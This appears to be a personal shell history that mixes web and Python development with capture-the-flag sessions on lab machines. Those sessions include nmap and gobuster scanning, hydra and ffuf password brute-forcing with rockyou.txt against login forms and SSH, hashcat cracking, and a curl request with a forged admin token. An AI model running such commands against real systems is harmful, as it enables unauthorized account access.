+ 2582  curl "https://10.10.29.69/get_password?name=localhost" -H "Host: helios.deadsystems.thm" -vk -b "passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/"
+ 2583  exit
+ 2584  clear
+ 2585  git pull origin main
+ 2586  clear
+ 2587  yarn workspace webapp run develop:lab
+ 2588  asdf install nodejs 12.22.12
+ 2589  asdf install python 2.7.18
+ 2590  asdf current python 2.7.18
+ 2591  asdf local python 2.7.18
+ 2592  asdf install nodejs 12.22.12
+ 2593  python -V
+ 2594  python2.7
+ 2595  clear
+ 2596  l
+ 2597  clear
+ 2598  asdf current
+ 2599  asdf list nodejs
+ 2600  node -v
+ 2601  npm i -g yarn 
+ 2602  clear
+ 2603  ls
+ 2604  yarn workspace webapp run develop:lab
+ 2605  asdf local nodejs 14.20.1
+ 2606  asdf global python 3.8.13
+ 2607  exit
+ 2608  yarn workspace webapp run develop:lab
+ 2609  clear
+ 2610  yarn workspace webapp run develop:lab
+ 2611  yatyarn
+ 2612  yarn
+ 2613  yarn workspace webapp run develop:lab
+ 2614  git submodule status
+ 2615  exit
+ 2616  ping 10.10.131.166
+ 2617  nmap -sC -sV 10.10.131.166
+ 2618  gobuster dir -u 10.10.131.166 -w ~/Documents/wordlist/Discovery/Web-Content/big.txt
+ 2619  cd ctfs
+ 2620  mkdir marketplace
+ 2621  cd marketplace
+ 2622  clear
+ 2623  nano users
+ 2624  hydra -L users -P ~/Documents/wordlist/rockyou.txt 10.10.131.166 http-post-form "/login:username=^USER^&password=ˆPASS^:Invalid password"
+ 2625  hydra -L 
+ 2626  hydra -h
+ 2627  hydra -L users -P ~/Documents/wordlist/rockyou.txt 10.10.131.166 http-post-form "/login:username=^USER^&password=ˆPASS^:Invalid password"
+ 2628  gobuster dir -u 10.10.131.166:32768 -w ~/Documents/wordlist/Discovery/Web-Content/big.txt
+ 2629  gobuster dir -u "http://10.10.131.166:32768" -w ~/Documents/wordlist/Discovery/Web-Content/big.txt
+ 2630  hydra -L users -P ~/Documents/wordlist/rockyou.txt 10.10.131.166 http-post-form "/login:username=^USER^&password=ˆPASS^:Invalid password" -v
+ 2631  hydra -L users -P ~/Documents/wordlist/rockyou.txt -v 10.10.131.166 http-post-form "/login:username=^USER^&password=ˆPASS^:Invalid password"
+ 2632  hydra -L users -P ~/Documents/wordlist/rockyou.txt -vfI 10.10.131.166 http-post-form "/login:username=^USER^&password=ˆPASS^:Invalid password"
+ 2633  hydra -L users -P ~/Documents/wordlist/rockyou.txt -vfI 10.10.131.166 http-post "/login:username=^USER^&password=ˆPASS^:Invalid password"
+ 2634  ls
+ 2635  ll
+ 2636  hydra -L users -P ~/Documents/wordlist/rockyou.txt -vfI 10.10.131.166 http-post "/login:username=^USER^&password=ˆPASS^:Invalid password"
+ 2637  ffuf -h
+ 2638  ffuf -w ~/Documents/wordlist/rockyou.txt -u http://10.10.131.166/login -X POST -d "username=michael&password=FUZZ"
+ 2639  ffuf -w ~/Documents/wordlist/rockyou.txt -u http://10.10.131.166/login -X POST -d "username=michael&password=FUZZ" -r
+ 2640  ffuf -w ~/Documents/wordlist/rockyou.txt -u http://10.10.131.166/login -X POST -d "username=michael&password=FUZZ" -rc
+ 2641  ffuf -w ~/Documents/wordlist/rockyou.txt -u http://10.10.131.166/login -X POST -d "username=michael&password=FUZZ" -rac
+ 2642  ffuf -w ~/Documents/wordlist/rockyou.txt -u http://10.10.131.166/login -X POST -d "username=michael&password=FUZZ" -r -ac
+ 2643  ffuf -fc -h
+ 2644  ffuf -w ~/Documents/wordlist/rockyou.txt -u http://10.10.131.166/login -X POST -d "username=michael&password=FUZZ" -r -ac -fs 0-778,780-99999
+ 2645  ffuf -w ~/Documents/wordlist/rockyou.txt -u http://10.10.131.166/login -X POST -d "username=jake&password=FUZZ" -r -ac -fs 0-778,780-99999
+ 2646  nmap -sC -sV --script=vuln 10.10.131.166
+ 2647  yarn
+ 2648  yarn workspace webapp run develop:lab
+ 2649  cd Desktop/projetos/nic
+ 2650  ls 
+ 2651  cd as-measurements-webapp
+ 2652  clear
+ 2653  cd webapp
+ 2654  yarn run lint
+ 2655  yarn workspace webapp run develop:lab
+ 2656  cd ~/Documents
+ 2657  ls
+ 2658  cd ..
+ 2659  cd ctfs
+ 2660  ls
+ 2661  clear
+ 2662  ls
+ 2663  mkdir jackofalltrades
+ 2664  cd jackofalltrades
+ 2665  clear
+ 2666  ls
+ 2667  nmap -sC -sV 10.10.59.44
+ 2668  curl 10.10.59.44 -p 22
+ 2669  curl 10.10.59.44:22
+ 2670  curl 10.10.59.44:22/assets/stego.jpg
+ 2671  curl 10.10.59.44:22/assets/stego.jpg --output stego.jpg
+ 2672  curl http://10.10.59.44:22/recovery.php
+ 2673  ls
+ 2674  string stego.jpg
+ 2675  strings stego.jpg
+ 2676  binwalk -e stego.jpg
+ 2677  ls
+ 2678  ll
+ 2679  binwalk stego.jpg
+ 2680  ll
+ 2681  code ,
+ 2682  code .
+ 2683  ssh johny@10.10.59.44 -p 80
+ 2684  gobuster dir -u "http://10.10.59.44:80" -w ~/Documents/wordlist/Discovery/Web-Content/big.txt
+ 2685  gobuster dir -u "http://10.10.59.44:22" -w ~/Documents/wordlist/Discovery/Web-Content/big.txt
+ 2686  brew install exiftool
+ 2687  exifTOOL
+ 2688  exiftool
+ 2689  exiftool stego.jpg
+ 2690  exiftool
+ 2691  exiftool -ee stego.jpg
+ 2692  ll
+ 2693  exiftool -u stego.jpg
+ 2694  ll
+ 2695  curl http://10.10.59.44:22/recovery.php
+ 2696  curl -X POST http://10.10.59.44:22/recovery.php --data="user=jack&pass=1234"
+ 2697  curl -X POST "http://10.10.59.44:22/recovery.php" --data="user=jack&pass=1234"
+ 2698  curl -h
+ 2699  curl -X POST "http://10.10.59.44:22/recovery.php" --data "user=jack&pass=1234"
+ 2700  hydra -L ~/Documents/wordlist/Usernames/top-usernames-shortlist.txt -p u?WtKSraq 
+ 2701  hydra --hlep
+ 2702  hydra -h
+ 2703  hydra -L ~/Documents/wordlist/Usernames/top-usernames-shortlist.txt -p u?WtKSraq 10.10.59.44 ssh
+ 2704  hydra -L ~/Documents/wordlist/Usernames/top-usernames-shortlist.txt -p "u?WtKSraq" 10.10.59.44 ssh
+ 2705  hydra -L ~/Documents/wordlist/Usernames/top-usernames-shortlist.txt -p "u?WtKSraq" 10.10.59.44 ssh -s 80
+ 2706  hydra -L ~/Documents/wordlist/Usernames/top-usernames-shortlist.txt -p "u?WtKSraq" -s 80 10.10.59.44 ssh
+ 2707  hydra -L ~/Documents/wordlist/rockyou.txt -p "u?WtKSraq" -s 80 10.10.59.44 ssh
+ 2708  ssh graves@10.10.59.44 -p 80 
+ 2709  ssh johny@10.10.59.44 -p 80 
+ 2710  ssh jake@10.10.59.44 -p 80 
+ 2711  ssh jack@10.10.59.44 -p 80 
+ 2712  haiti
+ 2713  haiti GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=
+ 2714  hashcat -m 24800 -w ~/Documents/wordlist/rockyou.txt hash
+ 2715  echo "GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=" > hash
+ 2716  hashcat -m 24800 -w ~/Documents/wordlist/rockyou.txt hash
+ 2717  hashcat -m 24800 --wordlist=~/Documents/wordlist/rockyou.txt hash
+ 2718  hashcat
+ 2719  hashcat --help
+ 2720  hashcat -m 24800 hash ~/Documents/wordlist/rockyou.txt
+ 2721  hashcat --help
+ 2722  hashcat -m 24800 hash ~/Documents/wordlist/rockyou.txt
+ 2723  nano hash
+ 2724  hashcat -m 24800 hash ~/Documents/wordlist/rockyou.txt
+ 2725  hashcat hash ~/Documents/wordlist/rockyou.txt
+ 2726  echo "UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==" > base64_default
+ 2727  steghide
+ 2728  brew install steghide
+ 2729  port install steghide
+ 2730  sudo port install steghide
+ 2731  clear
+ 2732  df -h
+ 2733  sudo port clean
+ 2734  ll
+ 2735  sudo port installed
+ 2736  $ sudo port -fp uninstall installed\n
+ 2737  sudo port -fp uninstall installed\n
+ 2738  clear
+ 2739  exit
+ 2740  ls
+ 2741  binwalk -e stego.jpg
+ 2742  exiftool --help
+ 2743  gem 
+ 2744  gem install zsteg
+ 2745  zsteg
+ 2746  zsteg stego.jpg
+ 2747  zsteg -E stego.jpg
+ 2748  zsteg -E stego.jpg -E 
+ 2749  zsteg stego.jpg -E 
+ 2750  zsteg stego.jpg
+ 2751  gem uninstall zsteg teg
+ 2752  brew upgrade
+ 2753  exit
+ 2754  omz update
+ 2755  exit
+ 2756  brew update
+ 2757  nano .zshrc
+ 2758  exit
+ 2759  rm -f ~/.zcompdump; compinit\n
+ 2760  exit
+ 2761  source /Users/felipe/Desktop/projetos/tcc/venv/bin/activate
+ 2762  pwd
+ 2763  ll
+ 2764  cd tcc
+ 2765  ls
+ 2766  cd rede_neural
+ 2767  ls
+ 2768  cd images
+ 2769  ls
+ 2770  clear
+ 2771  ls
+ 2772  pwd
+ 2773  source /Users/felipe/Desktop/projetos/tcc/venv/bin/activate
+ 2774  cd tcc/utils/
+ 2775  ls
+ 2776  clear
+ 2777  ls
+ 2778  source ../../venv/bin/activate
+ 2779  ls
+ 2780  clear
+ 2781  ls
+ 2782  python duplica_imagens.py
+ 2783  cd ../rede_neural/images
+ 2784  ls
+ 2785  mkdir original
+ 2786  mv 0_PSD_IN_10_PSD-tfr.jpg 0_PSD_IN_1_PSD-tfr.jpg 0_PSD_IN_2_PSD-tfr.jpg 0_PSD_IN_3_PSD-tfr.jpg 0_PSD_IN_4_PSD-tfr.jpg 0_PSD_IN_5_PSD-tfr.jpg 0_PSD_IN_6_PSD-tfr.jpg 0_PSD_IN_7_PSD-tfr.jpg 0_PSD_IN_8_PSD-tfr.jpg 0_PSD_IN_9_PSD-tfr.jpg 3_PSD_IN_10_PSD-tfr.jpg 3_PSD_IN_1_PSD-tfr.jpg 3_PSD_IN_2_PSD-tfr.jpg 3_PSD_IN_3_PSD-tfr.jpg 3_PSD_IN_4_PSD-tfr.jpg 3_PSD_IN_5_PSD-tfr.jpg 3_PSD_IN_6_PSD-tfr.jpg 3_PSD_IN_7_PSD-tfr.jpg 3_PSD_IN_8_PSD-tfr.jpg 3_PSD_IN_9_PSD-tfr.jpg  original
+ 2787  ls
+ 2788  rm 0_PSD_IN_10_PSD-tfr90 0_PSD_IN_1_PSD-tfr90 0_PSD_IN_2_PSD-tfr90 0_PSD_IN_3_PSD-tfr90 0_PSD_IN_4_PSD-tfr90 0_PSD_IN_5_PSD-tfr90 0_PSD_IN_6_PSD-tfr90 0_PSD_IN_7_PSD-tfr90 0_PSD_IN_8_PSD-tfr90 0_PSD_IN_9_PSD-tfr90 
+ 2789  ls
+ 2790  rm 3_PSD_IN_10_PSD-tfr90 3_PSD_IN_1_PSD-tfr90 3_PSD_IN_2_PSD-tfr90 3_PSD_IN_3_PSD-tfr90 3_PSD_IN_4_PSD-tfr90 3_PSD_IN_5_PSD-tfr90 3_PSD_IN_6_PSD-tfr90 3_PSD_IN_7_PSD-tfr90 3_PSD_IN_8_PSD-tfr90 3_PSD_IN_9_PSD-tfr90 
+ 2791  ls
+ 2792  clear
+ 2793  ls
+ 2794  pwd
+ 2795  cd ../../utils
+ 2796  python duplica_imagens.py
+ 2797  ll
+ 2798  rm 0_PSD_IN_10_PSD-tfr180.jpg 0_PSD_IN_10_PSD-tfr270.jpg 0_PSD_IN_10_PSD-tfr360.jpg 0_PSD_IN_10_PSD-tfr90.jpg 0_PSD_IN_1_PSD-tfr180.jpg 0_PSD_IN_1_PSD-tfr270.jpg 0_PSD_IN_1_PSD-tfr360.jpg 0_PSD_IN_1_PSD-tfr90.jpg 0_PSD_IN_2_PSD-tfr180.jpg 0_PSD_IN_2_PSD-tfr270.jpg 0_PSD_IN_2_PSD-tfr360.jpg 0_PSD_IN_2_PSD-tfr90.jpg 0_PSD_IN_3_PSD-tfr180.jpg 0_PSD_IN_3_PSD-tfr270.jpg 0_PSD_IN_3_PSD-tfr360.jpg 0_PSD_IN_3_PSD-tfr90.jpg 0_PSD_IN_4_PSD-tfr180.jpg 0_PSD_IN_4_PSD-tfr270.jpg 0_PSD_IN_4_PSD-tfr360.jpg 0_PSD_IN_4_PSD-tfr90.jpg 0_PSD_IN_5_PSD-tfr180.jpg 0_PSD_IN_5_PSD-tfr270.jpg 0_PSD_IN_5_PSD-tfr360.jpg 0_PSD_IN_5_PSD-tfr90.jpg 0_PSD_IN_6_PSD-tfr180.jpg 0_PSD_IN_6_PSD-tfr270.jpg 0_PSD_IN_6_PSD-tfr360.jpg 0_PSD_IN_6_PSD-tfr90.jpg 0_PSD_IN_7_PSD-tfr180.jpg 0_PSD_IN_7_PSD-tfr270.jpg 0_PSD_IN_7_PSD-tfr360.jpg 0_PSD_IN_7_PSD-tfr90.jpg 0_PSD_IN_8_PSD-tfr180.jpg 0_PSD_IN_8_PSD-tfr270.jpg 0_PSD_IN_8_PSD-tfr360.jpg 0_PSD_IN_8_PSD-tfr90.jpg 0_PSD_IN_9_PSD-tfr180.jpg 0_PSD_IN_9_PSD-tfr270.jpg 0_PSD_IN_9_PSD-tfr360.jpg 0_PSD_IN_9_PSD-tfr90.jpg 
+ 2799  rm 3_PSD_IN_10_PSD-tfr180.jpg 3_PSD_IN_10_PSD-tfr270.jpg 3_PSD_IN_10_PSD-tfr360.jpg 3_PSD_IN_10_PSD-tfr90.jpg 3_PSD_IN_1_PSD-tfr180.jpg 3_PSD_IN_1_PSD-tfr270.jpg 3_PSD_IN_1_PSD-tfr360.jpg 3_PSD_IN_1_PSD-tfr90.jpg 3_PSD_IN_2_PSD-tfr180.jpg 3_PSD_IN_2_PSD-tfr270.jpg 3_PSD_IN_2_PSD-tfr360.jpg 3_PSD_IN_2_PSD-tfr90.jpg 3_PSD_IN_3_PSD-tfr180.jpg 3_PSD_IN_3_PSD-tfr270.jpg 3_PSD_IN_3_PSD-tfr360.jpg 3_PSD_IN_3_PSD-tfr90.jpg 3_PSD_IN_4_PSD-tfr180.jpg 3_PSD_IN_4_PSD-tfr270.jpg 3_PSD_IN_4_PSD-tfr360.jpg 3_PSD_IN_4_PSD-tfr90.jpg 3_PSD_IN_5_PSD-tfr180.jpg 3_PSD_IN_5_PSD-tfr270.jpg 3_PSD_IN_5_PSD-tfr360.jpg 3_PSD_IN_5_PSD-tfr90.jpg 3_PSD_IN_6_PSD-tfr180.jpg 3_PSD_IN_6_PSD-tfr270.jpg 3_PSD_IN_6_PSD-tfr360.jpg 3_PSD_IN_6_PSD-tfr90.jpg 3_PSD_IN_7_PSD-tfr180.jpg 3_PSD_IN_7_PSD-tfr270.jpg 3_PSD_IN_7_PSD-tfr360.jpg 3_PSD_IN_7_PSD-tfr90.jpg 3_PSD_IN_8_PSD-tfr180.jpg 3_PSD_IN_8_PSD-tfr270.jpg 3_PSD_IN_8_PSD-tfr360.jpg 3_PSD_IN_8_PSD-tfr90.jpg 3_PSD_IN_9_PSD-tfr180.jpg 3_PSD_IN_9_PSD-tfr270.jpg 3_PSD_IN_9_PSD-tfr360.jpg 3_PSD_IN_9_PSD-tfr90.jpg 
+ 2800  ls
+ 2801  python duplica_imagens.py
+ 2802  rm 0_PSD_IN_10_PSD-tfr-360.jpg 0_PSD_IN_1_PSD-tfr-360.jpg 0_PSD_IN_2_PSD-tfr-360.jpg 0_PSD_IN_3_PSD-tfr-360.jpg 0_PSD_IN_4_PSD-tfr-360.jpg 0_PSD_IN_5_PSD-tfr-360.jpg 0_PSD_IN_6_PSD-tfr-360.jpg 0_PSD_IN_7_PSD-tfr-360.jpg 0_PSD_IN_8_PSD-tfr-360.jpg 0_PSD_IN_9_PSD-tfr-360.jpg 3_PSD_IN_10_PSD-tfr-360.jpg 3_PSD_IN_1_PSD-tfr-360.jpg 3_PSD_IN_2_PSD-tfr-360.jpg 3_PSD_IN_3_PSD-tfr-360.jpg 3_PSD_IN_4_PSD-tfr-360.jpg 3_PSD_IN_5_PSD-tfr-360.jpg 3_PSD_IN_6_PSD-tfr-360.jpg 3_PSD_IN_7_PSD-tfr-360.jpg 3_PSD_IN_8_PSD-tfr-360.jpg 3_PSD_IN_9_PSD-tfr-360.jpg 
+ 2803  rm 0_PSD_IN_10_PSD-tfr-0.jpg 0_PSD_IN_1_PSD-tfr-0.jpg 0_PSD_IN_2_PSD-tfr-0.jpg 0_PSD_IN_3_PSD-tfr-0.jpg 0_PSD_IN_4_PSD-tfr-0.jpg 0_PSD_IN_5_PSD-tfr-0.jpg 0_PSD_IN_6_PSD-tfr-0.jpg 0_PSD_IN_7_PSD-tfr-0.jpg 0_PSD_IN_8_PSD-tfr-0.jpg 0_PSD_IN_9_PSD-tfr-0.jpg 3_PSD_IN_10_PSD-tfr-0.jpg 3_PSD_IN_1_PSD-tfr-0.jpg 3_PSD_IN_2_PSD-tfr-0.jpg 3_PSD_IN_3_PSD-tfr-0.jpg 3_PSD_IN_4_PSD-tfr-0.jpg 3_PSD_IN_5_PSD-tfr-0.jpg 3_PSD_IN_6_PSD-tfr-0.jpg 3_PSD_IN_7_PSD-tfr-0.jpg 3_PSD_IN_8_PSD-tfr-0.jpg 3_PSD_IN_9_PSD-tfr-0.jpg 
+ 2804  python duplica_imagens.py
+ 2805  ls
+ 2806  cd original
+ 2807  ls
+ 2808  mv 0_PSD_IN_10_PSD-tfr.jpg 0_PSD_IN_1_PSD-tfr.jpg 0_PSD_IN_2_PSD-tfr.jpg 0_PSD_IN_3_PSD-tfr.jpg 0_PSD_IN_4_PSD-tfr.jpg 0_PSD_IN_5_PSD-tfr.jpg 0_PSD_IN_6_PSD-tfr.jpg 0_PSD_IN_7_PSD-tfr.jpg 0_PSD_IN_8_PSD-tfr.jpg 0_PSD_IN_9_PSD-tfr.jpg 3_PSD_IN_10_PSD-tfr.jpg 3_PSD_IN_1_PSD-tfr.jpg 3_PSD_IN_2_PSD-tfr.jpg 3_PSD_IN_3_PSD-tfr.jpg 3_PSD_IN_4_PSD-tfr.jpg 3_PSD_IN_5_PSD-tfr.jpg 3_PSD_IN_6_PSD-tfr.jpg 3_PSD_IN_7_PSD-tfr.jpg 3_PSD_IN_8_PSD-tfr.jpg 3_PSD_IN_9_PSD-tfr.jpg ../
+ 2809  ll
+ 2810  cd ..
+ 2811  ll
+ 2812  exit
+ 2813  count
+ 2814  uniq
+ 2815  wc -l
+ 2816  ls | wc -
+ 2817  l
+ 2818  ls | wc -l
+ 2819  ls -1 . | wc -l
+ 2820  ll
+ 2821  cd ..
+ 2822  wc -l
+ 2823  ls -1 . | wc -l
+ 2824  rm original
+ 2825  rm -r original
+ 2826  ls
+ 2827  clear
+ 2828  source /Users/felipe/Desktop/projetos/tcc/venv/bin/activate
+ 2829  python -m tcc.rede_neural.main
+ 2830  cd ..
+ 2831  python -m tcc.rede_neural.main
+ 2832  cd tcc
+ 2833  ls
+ 2834  cd tcc
+ 2835  python -m tcc.rede_neural.main
+ 2836  cd ..
+ 2837  python -m tcc.rede_neural.main
+ 2838  clear
+ 2839  exit
+ 2840  cd ..
+ 2841  cd nic
+ 2842  ll
+ 2843  git clone ssh://git@code.ceptro.br:7999/swms/as-simetas-api.git
+ 2844  clear
+ 2845  cd as-simetas-api
+ 2846  code
+ 2847  npm 
+ 2848  npx install-peerdeps --dev eslint-config-airbnb\n
+ 2849  cd webapp
+ 2850  npx install-peerdeps --dev eslint-config-airbnb\n
+ 2851  yarn
+ 2852  clear
+ 2853  git checkout origin/gatsby-upgrade 
+ 2854  clear
+ 2855  yarn
+ 2856  asdf local nodejs 18.7.0
+ 2857  yarn
+ 2858  npm i -g yarn
+ 2859  yarn
+ 2860  npm install -g npm@9.1.2
+ 2861  yarn
+ 2862  asdf local python 3.8.13
+ 2863  yarn
+ 2864  python
+ 2865  rm -rf node_modules
+ 2866  clear
+ 2867  cd ..
+ 2868  rm -r node_modules
+ 2869  deactivate
+ 2870  exit
+ 2871  python -V
+ 2872  asdf local python 3.8.13
+ 2873  python -V
+ 2874  yarn
+ 2875  asdf local nodejs 18.7.0
+ 2876  yarn
+ 2877  npx install-peerdeps --dev eslint-config-airbnb\n
+ 2878  yarn add -D eslint-config-airbnb@19.0.4 eslint@^8.2.0 eslint-plugin-import@^2.25.3 eslint-plugin-jsx-a11y@^6.5.1 eslint-plugin-react@^7.28.0 eslint-plugin-react-hooks@^4.3.0
+ 2879  cd webapp
+ 2880  yarn add -D eslint-config-airbnb@19.0.4 eslint@^8.2.0 eslint-plugin-import@^2.25.3 eslint-plugin-jsx-a11y@^6.5.1 eslint-plugin-react@^7.28.0 eslint-plugin-react-hooks@^4.3.0
+ 2881  yarn run lint
+ 2882  yarn add -D eslint-config-airbnb-typescript
+ 2883  yarn run lint
+ 2884  yarn run lint --fix
+ 2885  yarn add -D @typescript-eslint/typescript-estree
+ 2886  yarn run lint --fix
+ 2887  eslint --help
+ 2888  node_modules/.bin/eslint --hlep
+ 2889  node_modules/.bin/eslint --help
+ 2890  yarn run lint --fix
+ 2891  npm --help
+ 2892  npm i --help
+ 2893  yarn add redux
+ 2894  yarn run lint --fix
+ 2895  yarn run lint ../webapp-commons
+ 2896  cd ..
+ 2897  yarn run lint
+ 2898  yarn
+ 2899  yarn run lint
+ 2900  yarn run lint --fix
+ 2901  yarn run lint
+ 2902  yarn
+ 2903  yarn add -DW @typescript-eslint/space-before-blocks
+ 2904  yarn
+ 2905  yarn run lint
+ 2906  yarn
+ 2907  yarn run lint
+ 2908  yarn add -DW @typescript-eslint/eslint-plugin
+ 2909  yarn run lint
+ 2910  nmap 192.168.0.0/24
+ 2911  nmap 192.168.0.0/24 -vvv
+ 2912  nmap 192.168.0.0/24 -vvv -p22
+ 2913  ssh pi@192.168.0.72
+ 2914  ssh ubuntu@192.168.0.72
+ 2915  exit
+ 2916  ls
+ 2917  cd Desktop
+ 2918  cd projetos
+ 2919  ls
+ 2920  cd tcc
+ 2921  ls
+ 2922  source venv/bin/activate
+ 2923  python -m tcc.captura_de_dados.main
+ 2924* swig
+ 2925* swig -v
+ 2926* swig -help
+ 2927  python -m tcc.captura_de_dados.main
+ 2928  ll
+ 2929  cd tcc/captura_de_dados
+ 2930  ls
+ 2931  cd brain
+ 2932  ls
+ 2933  clear
+ 2934  ll
+ 2935  arch=aarch64 make build -B
+ 2936  pip install -e .
+ 2937  history
+ 2938  history | less
